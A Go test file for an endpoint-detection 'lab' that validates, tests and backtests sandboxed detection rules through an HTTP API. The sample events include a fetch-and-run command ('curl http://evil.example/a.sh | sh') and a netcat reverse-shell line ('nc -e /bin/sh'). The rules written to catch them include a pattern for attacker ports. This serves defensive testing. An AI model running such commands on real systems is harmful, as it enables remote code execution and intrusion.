// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func labDo(t *testing.T, method, url, tok, body string) (int, map[string]any) {
	t.Helper()
	req, _ := http.NewRequest(method, url, strings.NewReader(body))
	if tok != "" {
		req.Header.Set("Authorization", "Bearer "+tok)
	}
	r, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer r.Body.Close()
	b, _ := io.ReadAll(r.Body)
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	return r.StatusCode, m
}

func labIntp(i int) *int { return &i }

func TestLabParseErrorsNameField(t *testing.T) {
	cases := map[string]string{
		`{"condition":{"field":"nope","op":"equals","value":"x"}}`:                                                              "condition.field",
		`{"condition":{"field":"host","op":"like","value":"x"}}`:                                                                "condition.op",
		`{"condition":{"field":"host","op":"equals"}}`:                                                                          "condition.value",
		`{"condition":{"field":"host","op":"in","values":[]}}`:                                                                  "condition.values",
		`{"condition":{"field":"host","op":"regex","value":"(unclosed"}}`:                                                       "invalid regex",
		`{"condition":{"all":[{"field":"host","op":"equals","value":"a"},{"field":"x","op":"equals","value":"a"}]}}`:            "condition.all[1].field",
		`{"condition":{"field":"host","op":"equals","value":"a"},"threshold":{"count":0,"within_seconds":5}}`:                   "threshold.count",
		`{"condition":{"field":"host","op":"equals","value":"a"},"threshold":{"count":2,"within_seconds":5,"group_by":["zz"]}}`: "threshold.group_by[0]",
		`{"condition":{"field":"host","op":"equals","value":"a"},"technique":"bad"}`:                                            "technique",
		`{"condition":{"field":"host","op":"equals","value":"a"},"bogus":1}`:                                                    "bogus",
		`{"condition":{}}`: "condition",
		`{"condition":{"field":"host","op":"equals","value":"a","all":[{"field":"host","op":"equals","value":"a"}]}}`: "exactly one",
	}
	for in, want := range cases {
		_, err := ParseLabRule([]byte(in))
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: err=%v want substring %q", in, err, want)
		}
	}
	r, err := ParseLabRule([]byte(`{"mode":"live","enabled":true,"condition":{"field":"host","op":"equals","value":"a"}}`))
	if err != nil || r.Mode != "sandbox" {
		t.Fatalf("mode must be forced to sandbox: %v %+v", err, r)
	}
}

func TestLabOperators(t *testing.T) {
	ev := LabEvent{Host: "Web-01", UID: labIntp(0), Executable: "/usr/bin/Curl", Command: "curl http://evil.example/a.sh | sh", Path: "/tmp/x.sh", Destination: "10.0.0.5:4444"}
	tests := []struct {
		node string
		want bool
	}{
		{`{"field":"host","op":"equals","value":"web-01"}`, true},
		{`{"field":"host","op":"equals","value":"web-01","case_sensitive":true}`, false},
		{`{"field":"command","op":"contains","value":"evil.example"}`, true},
		{`{"field":"executable","op":"startswith","value":"/usr/bin"}`, true},
		{`{"field":"path","op":"endswith","value":".sh"}`, true},
		{`{"field":"path","op":"endswith","value":".py"}`, false},
		{`{"field":"command","op":"regex","value":"curl\\s+http.*\\|\\s*sh$"}`, true},
		{`{"field":"destination","op":"regex","value":":(4444|1337)$"}`, true},
		{`{"field":"host","op":"in","values":["a","WEB-01"]}`, true},
		{`{"field":"host","op":"in","values":["a","b"]}`, false},
		{`{"field":"uid","op":"equals","value":"0"}`, true},
		{`{"field":"parent_exe","op":"equals","value":"x"}`, false},
		{`{"not":{"field":"parent_exe","op":"equals","value":"x"}}`, true},
		{`{"all":[{"field":"host","op":"contains","value":"web"},{"field":"uid","op":"equals","value":"0"}]}`, true},
		{`{"all":[{"field":"host","op":"contains","value":"web"},{"field":"uid","op":"equals","value":"1"}]}`, false},
		{`{"any":[{"field":"host","op":"equals","value":"zz"},{"field":"path","op":"contains","value":"/tmp"}]}`, true},
		{`{"any":[{"field":"host","op":"equals","value":"zz"},{"field":"path","op":"contains","value":"/var"}]}`, false},
	}
	for _, tc := range tests {
		r, err := ParseLabRule([]byte(`{"condition":` + tc.node + `}`))
		if err != nil {
			t.Fatalf("%s: %v", tc.node, err)
		}
		got, tr := r.Condition.eval(ev, true)
		if got != tc.want || tr.Matched != got {
			t.Errorf("%s: got %v want %v", tc.node, got, tc.want)
		}
	}
}

func TestLabThresholdWindows(t *testing.T) {
	base := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	mk := func(host string, sec int) LabEvent {
		return LabEvent{Time: base.Add(time.Duration(sec) * time.Second), Host: host, Executable: "/bin/ssh"}
	}
	r, err := ParseLabRule([]byte(`{"condition":{"field":"executable","op":"endswith","value":"ssh"},"threshold":{"count":3,"within_seconds":10,"group_by":["host"]}}`))
	if err != nil {
		t.Fatal(err)
	}
	// h1: 3 inside 10s -> hit; h2: 3 spread over 30s -> no hit.
	ev := []LabEvent{mk("h1", 0), mk("h2", 0), mk("h1", 4), mk("h2", 15), mk("h1", 8), mk("h2", 30)}
	hits := r.Run(ev)
	if len(hits) != 1 || hits[0].Event.Host != "h1" || hits[0].Count != 3 {
		t.Fatalf("hits: %+v", hits)
	}
	// After a hit the window resets: 3 more needed.
	ev = append(ev, mk("h1", 9), mk("h1", 10))
	if got := len(r.Run(ev)); got != 1 {
		t.Fatalf("expected reset after hit, got %d", got)
	}
	// Unordered input is sorted by time.
	if got := len(r.Run([]LabEvent{mk("h1", 8), mk("h1", 0), mk("h1", 4)})); got != 1 {
		t.Fatalf("unordered: %d", got)
	}
}

func TestLabCaps(t *testing.T) {
	long := strings.Repeat("a", labMaxRegexLen+1)
	if _, err := ParseLabRule([]byte(`{"condition":{"field":"host","op":"regex","value":"` + long + `"}}`)); err == nil || !strings.Contains(err.Error(), "regex longer") {
		t.Fatalf("regex cap: %v", err)
	}
	// Catastrophic-backtracking pattern is fine under RE2 and returns promptly.
	r, err := ParseLabRule([]byte(`{"condition":{"field":"command","op":"regex","value":"(a+)+$"}}`))
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	r.Condition.eval(LabEvent{Command: strings.Repeat("a", 100000) + "b"}, false)
	if time.Since(start) > 2*time.Second {
		t.Fatal("regex too slow")
	}
	deep := `{"field":"host","op":"equals","value":"a"}`
	for i := 0; i < labMaxDepth+2; i++ {
		deep = `{"not":` + deep + `}`
	}
	if _, err := ParseLabRule([]byte(`{"condition":` + deep + `}`)); err == nil || !strings.Contains(err.Error(), "nesting") {
		t.Fatalf("depth cap: %v", err)
	}
	var sb strings.Builder
	for i := 0; i < labMaxNodes+1; i++ {
		if i > 0 {
			sb.WriteString(",")
		}
		sb.WriteString(`{"field":"host","op":"equals","value":"a"}`)
	}
	if _, err := ParseLabRule([]byte(`{"condition":{"any":[` + sb.String() + `]}}`)); err == nil || !strings.Contains(err.Error(), "condition nodes") {
		t.Fatalf("node cap: %v", err)
	}
}

func TestLabAPIAuthAndValidateTest(t *testing.T) {
	srv, _, tok := obsServer(t)
	for _, c := range []struct{ m, p string }{
		{"GET", "/v1/lab/rules"}, {"POST", "/v1/lab/rules"}, {"DELETE", "/v1/lab/rules?id=x"},
		{"POST", "/v1/lab/rules/validate"}, {"POST", "/v1/lab/rules/test"}, {"POST", "/v1/lab/rules/backtest"},
	} {
		if code, _ := labDo(t, c.m, srv.URL+c.p, "", "{}"); code != 401 {
			t.Errorf("%s %s unauthenticated: %d", c.m, c.p, code)
		}
	}
	code, m := labDo(t, "POST", srv.URL+"/v1/lab/rules/validate", tok, `{"condition":{"field":"zzz","op":"equals","value":"a"}}`)
	if code != 400 || !strings.Contains(fmt.Sprint(m["error"]), "condition.field") {
		t.Fatalf("validate bad: %d %v", code, m)
	}
	code, m = labDo(t, "POST", srv.URL+"/v1/lab/rules/validate", tok, `{"condition":{"field":"host","op":"equals","value":"a"}}`)
	if code != 200 || m["valid"] != true || m["mode"] != "sandbox" {
		t.Fatalf("validate ok: %d %v", code, m)
	}
	body := `{"rule":{"condition":{"all":[{"field":"executable","op":"endswith","value":"nc"},{"field":"command","op":"contains","value":"-e"}]}},
	  "events":[{"executable":"/bin/nc","command":"nc -e /bin/sh x"},{"executable":"/bin/nc","command":"nc x"},{"executable":"/bin/ls","command":"-e"}]}`
	code, m = labDo(t, "POST", srv.URL+"/v1/lab/rules/test", tok, body)
	if code != 200 || m["condition_matched"] != float64(1) {
		t.Fatalf("test: %d %v", code, m)
	}
	res := m["results"].([]any)
	first := res[0].(map[string]any)
	tr := first["trace"].(map[string]any)
	if first["matched"] != true || len(tr["children"].([]any)) != 2 {
		t.Fatalf("trace: %v", first)
	}
	code, _ = labDo(t, "POST", srv.URL+"/v1/lab/rules/test", tok, `{"rule":{"condition":{"field":"host","op":"equals","value":"a"}},"events":[]}`)
	if code != 400 {
		t.Fatalf("empty events: %d", code)
	}
	huge := `{"rule":{"condition":{"field":"host","op":"equals","value":"a"}},"events":[{"command":"` + strings.Repeat("x", labMaxTestBody) + `"}]}`
	if code, _ = labDo(t, "POST", srv.URL+"/v1/lab/rules/test", tok, huge); code != 413 {
		t.Fatalf("body cap: %d", code)
	}
}

func TestLabBacktestAndPersistence(t *testing.T) {
	srv, s, tok := obsServer(t)
	base := time.Now().UTC().Add(-48 * time.Hour)
	for i := 0; i < 30; i++ {
		host := "h1"
		if i%3 == 0 {
			host = "h2"
		}
		exe := "/usr/bin/curl"
		if i%5 == 0 {
			exe = "/bin/ls"
		}
		_, err := s.Ingest(Event{ID: fmt.Sprint("e", i), Time: base.Add(time.Duration(i) * 2 * time.Hour), Host: host, PID: 100 + i, Executable: exe, Command: exe + " x"})
		if err != nil {
			t.Fatal(err)
		}
	}
	_ = s.Append(Finding{ID: "f1", Time: base, Host: "h3", Rule: "x", Severity: "high"})

	code, m := labDo(t, "POST", srv.URL+"/v1/lab/rules/backtest", tok, `{"rule":{"condition":{"field":"executable","op":"endswith","value":"curl"}}}`)
	if code != 200 {
		t.Fatalf("backtest: %d %v", code, m)
	}
	if m["mode"] != "sandbox" || m["hit_count"] != float64(24) {
		t.Fatalf("backtest hits: %v", m)
	}
	if len(m["hit_sample"].([]any)) != 20 {
		t.Fatalf("sample cap: %d", len(m["hit_sample"].([]any)))
	}
	if len(m["top_hosts"].([]any)) == 0 || len(m["hits_per_day"].([]any)) < 2 {
		t.Fatalf("aggregates: %v", m)
	}
	if n := m["noise_per_host_per_day"].(float64); n <= 0 {
		t.Fatalf("noise: %v", n)
	}

	// Persistence, upsert, mode, delete.
	code, m = labDo(t, "POST", srv.URL+"/v1/lab/rules", tok, `{"id":"r1","name":"curl","technique":"T1105","enabled":true,"mode":"live","condition":{"field":"executable","op":"endswith","value":"curl"}}`)
	if code != 200 || m["mode"] != "sandbox" {
		t.Fatalf("create: %d %v", code, m)
	}
	labDo(t, "POST", srv.URL+"/v1/lab/rules", tok, `{"id":"r1","name":"curl2","condition":{"field":"host","op":"equals","value":"h1"}}`)
	_, m = labDo(t, "GET", srv.URL+"/v1/lab/rules", tok, "")
	rules := m["rules"].([]any)
	if len(rules) != 1 || rules[0].(map[string]any)["name"] != "curl2" || rules[0].(map[string]any)["mode"] != "sandbox" {
		t.Fatalf("list: %v", m)
	}
	// Reload from disk through a fresh mux.
	mux2 := http.NewServeMux()
	RegisterDetectionLab(mux2, tok, s)
	ts := httptest.NewServer(mux2)
	defer ts.Close()
	_, m = labDo(t, "GET", ts.URL+"/v1/lab/rules", tok, "")
	if len(m["rules"].([]any)) != 1 {
		t.Fatalf("reload: %v", m)
	}
	// Backtest by stored id.
	code, m = labDo(t, "POST", srv.URL+"/v1/lab/rules/backtest", tok, `{"rule_id":"r1"}`)
	if code != 200 || m["hit_count"].(float64) == 0 {
		t.Fatalf("backtest by id: %d %v", code, m)
	}
	if code, _ = labDo(t, "POST", srv.URL+"/v1/lab/rules/backtest", tok, `{"rule_id":"nope"}`); code != 404 {
		t.Fatalf("missing id: %d", code)
	}
	if code, _ = labDo(t, "DELETE", srv.URL+"/v1/lab/rules?id=r1", tok, ""); code != 200 {
		t.Fatalf("delete: %d", code)
	}
	if code, _ = labDo(t, "DELETE", srv.URL+"/v1/lab/rules?id=r1", tok, ""); code != 404 {
		t.Fatalf("delete twice: %d", code)
	}
}

func TestLabRuleCapAndNoPromotion(t *testing.T) {
	srv, _, tok := obsServer(t)
	for i := 0; i < labMaxRules; i++ {
		body := fmt.Sprintf(`{"id":"r%d","condition":{"field":"host","op":"equals","value":"a"}}`, i)
		if code, _ := labDo(t, "POST", srv.URL+"/v1/lab/rules", tok, body); code != 200 {
			t.Fatalf("rule %d: %d", i, code)
		}
	}
	if code, _ := labDo(t, "POST", srv.URL+"/v1/lab/rules", tok, `{"id":"overflow","condition":{"field":"host","op":"equals","value":"a"}}`); code != 409 {
		t.Fatalf("cap: %d", code)
	}
	// Lab rules never reach live detections.
	if got := MatchCustomRules("a"); len(got) > 0 {
		for _, r := range got {
			if strings.HasPrefix(fmt.Sprint(r["id"]), "r") && fmt.Sprint(r["id"]) == "r1" {
				t.Fatal("lab rule leaked into custom rules")
			}
		}
	}
}

func TestLabEventCap(t *testing.T) {
	s, err := testStore(t, t.TempDir()+"/f.jsonl", labMaxEvents+10)
	if err != nil {
		t.Fatal(err)
	}
	s.mu.Lock()
	for i := 0; i < labMaxEvents+5; i++ {
		s.fileEvents = append(s.fileEvents, FileEvent{Host: "h", Path: "/x", Time: time.Now()})
	}
	s.mu.Unlock()
	ev, trunc := labEventsFromStore(s)
	if len(ev) != labMaxEvents || !trunc {
		t.Fatalf("cap: %d %v", len(ev), trunc)
	}
}
